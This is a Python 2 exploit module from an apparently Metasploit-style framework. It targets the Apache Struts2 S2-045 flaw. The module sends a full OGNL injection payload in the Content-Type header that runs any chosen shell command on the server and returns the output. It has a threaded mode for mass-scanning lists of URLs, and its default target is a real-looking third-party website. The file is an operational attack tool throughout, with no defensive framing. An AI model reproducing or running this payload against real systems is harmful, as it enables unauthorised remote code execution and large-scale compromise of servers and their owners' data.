# encoding:utf8
import requests
import os
from core import help
from comm import *
from threading import Thread
import Queue

options = ["http://wechat.assn.cn/index.action","","whoami","6"]
url      = options[0]
files    = options[1]
cmd     = options[2]
threads = options[3]

def exp():

    ksf_1 = ksf_line("exp","s2_045")
    com = raw_input(ksf_1)
    
    global url
    global files
    global cmd
    global threads

    try:
        if com[0:7] == 'set url':
            url = com[8:]
            print tag_true + "url => " + url
            exp()

        elif com[0:9] == 'set files': 
            files = com[10:]
            print tag_true + "files => " + files
            exp()

        elif com[0:7] == 'set cmd':
            cmd = com[8:]
            print tag_true + "cmd => " + cmd
            exp()

        elif com[0:11] == 'set threads':
            threads = com[12:]
            print tag_true + "threads => " + threads
            exp()

        elif com[0:12] == 'show options':
            show_op()
            print "URL\t\t" + url + "\t\tThe target address"
            print "FILES\t\t" + files + "\t\tThe target address for files"
            print "CMD\t\t" + cmd + "\t\tExec command"
            print "THREADS\t\t" + threads + "\t\tThe number of concurrent threads"
            exp()

        elif com[0:1] == '!':
            os.system(com[1:])
            exp()

        elif com[0:4] == 'help':
            help.help()
            exp()

        elif com[0:4] == 'back':
            pass

        elif com[0:4] == 'exit':
            exit(0)

        elif com[0:3] == 'run' or com[0:7] == 'exploit':
            data = '--447635f88b584ab6b8d9c17d04d79918\
                    Content-Disposition: form-data; name="image1"\
                    Content-Type: text/plain; charset=utf-8\
                    \
                    x\
                    --447635f88b584ab6b8d9c17d04d79918--'
    
            header = {
                "Content-Length" : "155",
                "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
                "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
                }

            if files:
                cmd = "whoami"
                threads_list = []
                url_queue = Queue.Queue()

                with open(files,'r') as f:
                    for line in f.readlines():    
                        url_queue.put(line.rstrip())

                def do(url):
                    try:
                        r = requests.post(url, data=data, headers=header, timeout=10)
                        if len(r.content) < 60:
                            print tag_vul + url +"\t" + " [whoami] => " + r.content
                        else:
                            pass
                    except:pass

                def scan():
                    while not url_queue.empty():
                        do(url_queue.get())

                for i in range(int(threads)):
                    t = Thread(target=scan)
                    t.start()
                    threads_list.append(t)
                for i in range(int(threads)):
                    threads_list[i].join()

                exp()

            else:
                try:
                    r = requests.post(url, data=data, headers=header, timeout=10)
                    print r.content
                except:
                    print  tag_false + "error!"
                exp()
        else:
            exp()

    except KeyboardInterrupt:
        print_err("[*] Detected Ctrl-C ,System Exit...")
        